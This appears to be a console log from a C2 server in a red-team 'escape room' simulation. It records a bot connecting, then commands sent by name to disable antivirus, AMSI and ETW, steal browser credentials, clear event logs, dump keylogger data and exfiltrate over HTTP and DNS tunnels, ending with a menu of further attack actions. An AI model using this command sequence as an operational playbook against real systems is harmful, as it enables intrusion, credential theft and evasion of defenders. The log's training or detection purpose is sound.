@@ -1,0 +1,1020 @@
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 0         |  Elevated: 0         |  Beacons: 0        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 0       |  Server Uptime: 0          min |
+| [19:04:45] SERVER STATUS: ONLINE | Recent Activity: 21 entries |
+[2025-08-24 19:04:45] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 0 | Elevated: 0 | Commands: 0
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 0 commands sent recently | Total Session: 0 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 0 | Elevated: 0... |
+| [C2] HELP: Press 'H' to show keyboard shortcuts at any time  |
+| [C2] WEB_DASHBOARD: Web interface active at http://localh... |
+| [C2] READY: C2 Server ready for connections. Press ESC to... |
+| [C2] REVERSE_SHELL: Reverse shell listener on port 4444      |
+| [SERVER] START: C2 server listening on port 443              |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:04:45] Server running. Total commands sent: 0
+[2025-08-24 19:04:49] [ATTACK         ] [NEW_BOT             ] New bot infection from 3.81.15.120
+[2025-08-24 19:04:49] [C2             ] [NEW_CONNECTION      ] New bot connected from 3.81.15.120:51261
+[2025-08-24 19:04:49] [C2_BEACON      ] [COMMAND_AND_CONTROL ] C&C Server Active - Server IP: 172.31.36.70 Port: 443 - Client Connected From: 3.81.15.120
+[2025-08-24 19:04:50] [C2_ATTRIBUTION ] [COMMAND_CONTROL_SERVER] *** C&C Server Detected ***
+    C2 Server IP: 172.31.36.70
+    C2 Server Port: 443
+    C2 Protocol: Custom Encrypted Protocol
+    C2 Type: Advanced Persistent Threat (APT)
+    Threat Actor: Red Team Simulation
+    Campaign ID: 68ab6252-260d
+    Client IP: 3.81.15.120
+    Connection Time: 2025-08-24 19:04:50
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 0         |  Elevated: 0         |  Beacons: 0        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 0       |  Server Uptime: 0          min |
+| [19:04:50] SERVER STATUS: ONLINE | Recent Activity: 26 entries |
+[2025-08-24 19:04:50] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 0 | Elevated: 0 | Commands: 0
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 0 commands sent recently | Total Session: 0 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 0 | Elevated: 0... |
+| [C2_ATTRIBUTION] COMMAND_CONTROL_SERVER: *** C&C Server D... |
+| [C2_BEACON] COMMAND_AND_CONTROL: C&C Server Active - Serv... |
+| [C2] NEW_CONNECTION: New bot connected from 3.81.15.120:5... |
+| [ATTACK] NEW_BOT: New bot infection from 3.81.15.120         |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 0 | Elevated: 0... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:04:50] Server running. Total commands sent: 0
+Server:  UnKnown
+Address:  172.31.36.70
+
+[2025-08-24 19:04:50] [DNS_C2         ] [DNS_TUNNELING       ] DNS-based C2 communication to beacon.update.microsoft.com (C2 Server: 172.31.36.70)
+Server:  UnKnown
+Address:  172.31.36.70
+
+[2025-08-24 19:04:50] [DNS_C2         ] [DNS_TUNNELING       ] DNS-based C2 communication to telemetry.windows.com (C2 Server: 172.31.36.70)
+Server:  UnKnown
+Address:  172.31.36.70
+
+[2025-08-24 19:04:50] [DNS_C2         ] [DNS_TUNNELING       ] DNS-based C2 communication to c2.1Yexuiea.com (C2 Server: 172.31.36.70)
+Server:  UnKnown
+Address:  172.31.36.70
+
+[2025-08-24 19:04:50] [DNS_C2         ] [DNS_TUNNELING       ] DNS-based C2 communication to cnc.oEiIgx.net (C2 Server: 172.31.36.70)
+Server:  ip-172-31-0-2.ec2.internal
+Address:  172.31.0.2
+
+Ok.
+
+[2025-08-24 19:04:51] [C2             ] [CLIENT_INFO         ] Bot Details - Host: -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d, User: , OS: , Elevated: NO, GUID:
+[2025-08-24 19:04:51] [C2             ] [MANUAL_MODE         ] === CLIENT CONNECTED - MANUAL CONTROL MODE ===
+[2025-08-24 19:04:51] [C2             ] [MANUAL_MODE         ] Client 3.81.15.120:51261 ready for manual commands
+[2025-08-24 19:04:51] [C2             ] [MANUAL_MODE         ] Use keyboard shortcuts or web dashboard to execute commands
+[2025-08-24 19:04:51] [C2             ] [MANUAL_MODE         ] Press 'H' for help menu with all available commands
+[2025-08-24 19:04:51] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_22704_8845062] Command HEARTBEAT_BEACON sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: HEARTBEAT_BEACON (ID: 1) to 3.81.15.120:51261
+[2025-08-24 19:04:51] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent HEARTBEAT_BEACON packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 1
+[2025-08-24 19:04:51] [C2             ] [COMMAND_SENT        ] Sent HEARTBEAT_BEACON to 3.81.15.120:51261
+[2025-08-24 19:04:51] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:HEARTBEAT_BEACON:REQUEST_DATA
+ - Bytes: 34
+
+[!] MANUAL COMMAND TRIGGERED: S - Screenshot Capture
+[2025-08-24 19:04:52] [*** MANUAL *** ] [S_PRESSED           ] Screenshot capture initiated by operator
+[2025-08-24 19:04:52] [C2             ] [COMMAND             ] Taking screenshots from all bots
+[+] Command queued for 1 active client(s)
+[2025-08-24 19:04:53] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:04:53] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_41_8847218] Command SCREENSHOT_CAPTURE sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: SCREENSHOT_CAPTURE (ID: 32) to 3.81.15.120:51261
+[2025-08-24 19:04:53] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent SCREENSHOT_CAPTURE packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 32
+[2025-08-24 19:04:53] [C2             ] [COMMAND_SENT        ] Sent SCREENSHOT_CAPTURE to 3.81.15.120:51261
+[2025-08-24 19:04:53] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:SCREENSHOT_CAPTURE:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:04:53] [C2             ] [COMMAND_SENT        ] Sent SCREENSHOT_CAPTURE to 3.81.15.120:51261
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 1        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 2       |  Server Uptime: 0          min |
+| [19:04:55] SERVER STATUS: ONLINE | Recent Activity: 48 entries |
+[2025-08-24 19:04:55] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 2
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 4  s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 2 commands sent recently | Total Session: 2 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND_SENT: Sent SCREENSHOT_CAPTURE to 3.81.15.120... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+| [C2] COMMAND_SENT: Sent SCREENSHOT_CAPTURE to 3.81.15.120... |
+| [DEBUG] COMMAND_PACKET_SENT: Sent SCREENSHOT_CAPTURE pack... |
+| [CMD_SENT] COMMAND_DISPATCH: [SRV_CMD_41_8847218] Command... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:04:55] Server running. Total commands sent: 2
+[2025-08-24 19:04:56] [C2             ] [COMMAND             ] Disabling AV and bypassing AMSI/ETW on all bots
+[2025-08-24 19:04:56] [C2             ] [PROCESSING_QUEUE    ] Processing 3 queued commands for 3.81.15.120:51261
+[2025-08-24 19:04:56] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_18467_8850531] Command ANTIVIRUS_DISABLING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: ANTIVIRUS_DISABLING (ID: 112) to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent ANTIVIRUS_DISABLING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 112
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent ANTIVIRUS_DISABLING to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:ANTIVIRUS_DISABLING:REQUEST_DATA
+ - Bytes: 37
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent ANTIVIRUS_DISABLING to 3.81.15.120:51261
+[2025-08-24 19:04:56] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_6334_8850531] Command AMSI_BYPASS_TECHNIQUE sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: AMSI_BYPASS_TECHNIQUE (ID: 117) to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent AMSI_BYPASS_TECHNIQUE packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 117
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent AMSI_BYPASS_TECHNIQUE to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:AMSI_BYPASS_TECHNIQUE:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent AMSI_BYPASS_TECHNIQUE to 3.81.15.120:51261
+[2025-08-24 19:04:56] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_26500_8850546] Command ETW_LOGGING_DISABLING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: ETW_LOGGING_DISABLING (ID: 118) to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent ETW_LOGGING_DISABLING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 118
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent ETW_LOGGING_DISABLING to 3.81.15.120:51261
+[2025-08-24 19:04:56] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:ETW_LOGGING_DISABLING:REQUEST_DATA
+ - Bytes: 39
+[2025-08-24 19:04:56] [C2             ] [COMMAND_SENT        ] Sent ETW_LOGGING_DISABLING to 3.81.15.120:51261
+[2025-08-24 19:04:57] [C2             ] [COMMAND             ] Stealing browser credentials on all bots
+[2025-08-24 19:04:58] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:04:58] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_19169_8852093] Command BROWSER_CREDENTIAL_THEFT sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: BROWSER_CREDENTIAL_THEFT (ID: 36) to 3.81.15.120:51261
+[2025-08-24 19:04:58] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent BROWSER_CREDENTIAL_THEFT packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 36
+[2025-08-24 19:04:58] [C2             ] [COMMAND_SENT        ] Sent BROWSER_CREDENTIAL_THEFT to 3.81.15.120:51261
+[2025-08-24 19:04:58] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:BROWSER_CREDENTIAL_THEFT:REQUEST_DATA
+ - Bytes: 42
+[2025-08-24 19:04:58] [C2             ] [COMMAND_SENT        ] Sent BROWSER_CREDENTIAL_THEFT to 3.81.15.120:51261
+[2025-08-24 19:04:59] [C2             ] [COMMAND             ] Clearing logs on all bots
+[2025-08-24 19:04:59] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_9930_8853578] Command HEARTBEAT_BEACON sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: HEARTBEAT_BEACON (ID: 1) to 3.81.15.120:51261
+[2025-08-24 19:04:59] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent HEARTBEAT_BEACON packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 1
+[2025-08-24 19:04:59] [C2             ] [COMMAND_SENT        ] Sent HEARTBEAT_BEACON to 3.81.15.120:51261
+[2025-08-24 19:04:59] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:HEARTBEAT_BEACON:REQUEST_DATA
+ - Bytes: 34
+[2025-08-24 19:04:59] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_13977_8853593] Command EVENT_LOG_CLEARING sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: EVENT_LOG_CLEARING (ID: 113) to 3.81.15.120:51261
+[2025-08-24 19:04:59] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent EVENT_LOG_CLEARING packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 113
+[2025-08-24 19:04:59] [C2             ] [COMMAND_SENT        ] Sent EVENT_LOG_CLEARING to 3.81.15.120:51261
+[2025-08-24 19:04:59] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:EVENT_LOG_CLEARING:REQUEST_DATA
+ - Bytes: 36
+[2025-08-24 19:04:59] [C2             ] [COMMAND             ] Dumping keylogger data from all bots
+[2025-08-24 19:05:00] [DEBUG          ] [DATA_CHUNK_RECEIVED ] From 3.81.15.120:51261 - Chunk size: 88 - Total so far: 88
+[2025-08-24 19:05:00] [DEBUG          ] [RAW_DATA_RECEIVED   ] From 3.81.15.120:51261 - Total bytes: 88 - First 50 chars: HEARTBEAT:35.175.236.219:443_8842796:8847828HEARTB
+[2025-08-24 19:05:00] [DEBUG          ] [DECRYPTED_DATA      ] From 3.81.15.120:51261 - Length: 88 - Preview: HEARTBEAT:35.175.236.219:443_8842796:8847828HEARTBEAT:35.175.236.219:443_8842796:8852843
+[2025-08-24 19:05:00] [CMD_RESPONSE   ] [RESPONSE_RECEIVED   ] [RESP_8854125_3.81.15.120:51261] From 3.81.15.120:51261: HEARTBEAT:35.175.236.219:443_8842796:8847828HEARTBEAT:35.175.236.219:443_8842796:8852843 (88 bytes)
+[2025-08-24 19:05:00] [DEBUG          ] [UNRECOGNIZED_DATA   ] Saving unrecognized data from 3.81.15.120:51261 - Length: 88
+[2025-08-24 19:05:00] [ERROR          ] [EVIDENCE_SAVE_FAILED] Failed to save unknown to C:\evidence\-%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d\unknown\20250824_190500_86.txt
+[2025-08-24 19:05:00] [C2             ] [PROCESSING_QUEUE    ] Processing 1 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:00] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_15724_8854187] Command KEYLOGGER_DATA_RETRIEVAL sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: KEYLOGGER_DATA_RETRIEVAL (ID: 34) to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent KEYLOGGER_DATA_RETRIEVAL packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 34
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent KEYLOGGER_DATA_RETRIEVAL to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:KEYLOGGER_DATA_RETRIEVAL:REQUEST_DATA
+ - Bytes: 42
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent KEYLOGGER_DATA_RETRIEVAL to 3.81.15.120:51261
+[2025-08-24 19:05:00] [C2             ] [COMMAND             ] Executing data exfiltration on all bots
+
+================================================================================
+
++==============================================================+
+|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |
++==============================================================+
+| Active Bots: 1         |  Elevated: 0         |  Beacons: 2        |
+| Server Jobs: 0         |  Queued: 0           |  Workers: 6        |
+| Commands Sent: 9       |  Server Uptime: 0          min |
+| [19:05:00] SERVER STATUS: ONLINE | Recent Activity: 96 entries |
+[2025-08-24 19:05:00] [SERVER_STATUS  ] [DASHBOARD_UPDATE    ] Active: 1 | Elevated: 0 | Commands: 9
++--------------------------------------------------------------+
+|                        CONNECTED BOTS                        |
++--------------------------------------------------------------+
++---------------------- COMMAND STATUS -----------------------+
+| [2025-08-24 16:53:37] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:37] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:42] [SERVER_STATUS] [DASHBOARD_UPDATE] ... |
+| [2025-08-24 16:53:46] [CMD_SENT] [COMMAND_DISPATCH] [SRV_... |
+| [2025-08-24 16:53:46] [CMD_RESPONSE] [RESPONSE_RECEIVED] ... |
++--------------------------------------------------------------+
+| -%*8+'='28$*U^eO]XtBF\s]QPI_f[\2hYX]vUB'2152 ;U^eO]XtBF\s]QPI_f[\2hYX]vUBU}KWSG\d | 3.81.15.120     |              | Up: 0  m | LS: 1  s |
++==============================================================+
+|                     ATTACK INDICATORS                        |
++--------------------------------------------------------------+
+| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|
+| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |
+| [ACTIVE] Process Injection       | [READY]  Ransomware       |
++--------------------------------------------------------------+
+|                    TEST EXECUTION STATUS                     |
++--------------------------------------------------------------+
+| -%*8+'='2 | Progress: 0 /10 phases | Status: TESTING IN PROGRESS  |
++==============================================================+
+
++----------------------- CONTROL LEGEND -----------------------+
+| MANUAL MODE ACTIVE - Press H for full help menu             |
+| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |
+| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |
+| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |
+| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |
++--------------------------------------------------------------+
+
++----------------------- RECENT ACTIVITY ----------------------+
+| COMMAND STATUS: 9 commands sent recently | Total Session: 9 commands |
+| FILE LOGGING: C:\temp\c2_server_status.txt (persistent)                 |
+| [SERVER_STATUS] DASHBOARD_UPDATE: Active: 1 | Elevated: 0... |
+| [C2] COMMAND: Executing data exfiltration on all bots        |
+| [C2] COMMAND_SENT: Sent KEYLOGGER_DATA_RETRIEVAL to 3.81.... |
+| [DEBUG] TEXT_COMMAND_SENT: Sent text command to 3.81.15.1... |
+| [C2] COMMAND_SENT: Sent KEYLOGGER_DATA_RETRIEVAL to 3.81.... |
+| [DEBUG] COMMAND_PACKET_SENT: Sent KEYLOGGER_DATA_RETRIEVA... |
+|                                                              |
+|                                                              |
++--------------------------------------------------------------+
+
+[2025-08-24 19:05:00] Server running. Total commands sent: 9
+[2025-08-24 19:05:00] [C2             ] [PROCESSING_QUEUE    ] Processing 3 queued commands for 3.81.15.120:51261
+[2025-08-24 19:05:00] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_11478_8854828] Command DATA_COMPRESSION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: DATA_COMPRESSION (ID: 129) to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent DATA_COMPRESSION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 129
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent DATA_COMPRESSION to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:DATA_COMPRESSION:REQUEST_DATA
+ - Bytes: 34
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent DATA_COMPRESSION to 3.81.15.120:51261
+[2025-08-24 19:05:00] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_29358_8854843] Command HTTP_DATA_EXFILTRATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: HTTP_DATA_EXFILTRATION (ID: 130) to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent HTTP_DATA_EXFILTRATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 130
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent HTTP_DATA_EXFILTRATION to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:HTTP_DATA_EXFILTRATION:REQUEST_DATA
+ - Bytes: 40
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent HTTP_DATA_EXFILTRATION to 3.81.15.120:51261
+[2025-08-24 19:05:00] [CMD_SENT       ] [COMMAND_DISPATCH    ] [SRV_CMD_26962_8854843] Command DNS_TUNNEL_EXFILTRATION sent to 3.81.15.120:51261 (24 bytes)
+
+[!] SENDING COMMAND: DNS_TUNNEL_EXFILTRATION (ID: 131) to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [COMMAND_PACKET_SENT ] Sent DNS_TUNNEL_EXFILTRATION packet to 3.81.15.120:51261 - Bytes: 24 - Command ID: 131
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent DNS_TUNNEL_EXFILTRATION to 3.81.15.120:51261
+[2025-08-24 19:05:00] [DEBUG          ] [TEXT_COMMAND_SENT   ] Sent text command to 3.81.15.120:51261 - Command: CMD:DNS_TUNNEL_EXFILTRATION:REQUEST_DATA
+ - Bytes: 41
+[2025-08-24 19:05:00] [C2             ] [COMMAND_SENT        ] Sent DNS_TUNNEL_EXFILTRATION to 3.81.15.120:51261
+
++============================================================================+
+|                     C2 SERVER MANUAL CONTROL - HELP MENU                   |
++============================================================================+
+| NOTE: All commands are executed on ALL connected clients                   |
++============================================================================+
+| ATTACK PHASES (Manual Execution):                                          |
+|   1 - Phase 1: Initial Reconnaissance                                      |
+|   2 - Phase 2: Privilege Escalation                                        |
+|   3 - Phase 3: Defense Evasion                                            |
+|   4 - Phase 4: Credential Access & Surveillance                            |
+|   5 - Phase 5: Lateral Movement & Persistence                             |
++============================================================================+
+| INDIVIDUAL COMMANDS:                                                       |
+|   A - Disable AV/AMSI/ETW (Defense Evasion)                              |
+|   B - Browser Credential Theft (Chrome/Firefox/Edge)                      |
+|   C - Clear Windows Event Logs                                            |
+|   D - Dump Keylogger Data                                                 |
+|   E - Exfiltrate Data (HTTP/DNS)                                          |
+|   K - Start Keylogger                                                     |
+|   L - Lateral Movement (Port Scan + SMB)                                  |
+|   M - Mimikatz/LSASS Memory Dump                                          |
+|   N - Network Tunnels (SSH/Netcat/Socat/Cryptcat) [REAL PROCESSES]      |
+|   O - TOR Netcat/Socat/Cryptcat Connections [REAL PROCESSES]            |
+|   P - Install Persistence (Registry/Scheduled Task)                       |
+|   R - Deploy Ransomware Simulation                                        |
+|   S - Take Screenshot                                                     |
+|   T - TOR Connections & API Calls [REAL NETWORK TRAFFIC]                 |
+|   W - Webcam Capture                                                      |
++============================================================================+
+| FUNCTION KEYS:                                                            |
+|   F1  - Full System Information Collection                                |
+|   F2  - Process Hollowing Demonstration                                   |
+|   F3  - Microphone Recording                                              |
+|   F4  - Clipboard Data Capture                                           |
+|   F5  - File Search & Enumeration                                        |
+|   F6  - Screen Recording (10 seconds)                                    |
+|   F7  - Token Stealing/Impersonation                                     |
+|   F8  - SAM Database Dump                                                |
+|   F9  - Install Rootkit/Bootkit                                          |
+|   F10 - Deploy Crypto Miner                                              |
+|   F11 - Cloud Service Upload                                             |
+|   F12 - Enable Remote Desktop & Create User                              |
++============================================================================+
+| CONTROL:                                                                   |
+|   H   - Show this help menu                                              |
+|   ESC - Shutdown C2 server                                               |
++============================================================================+
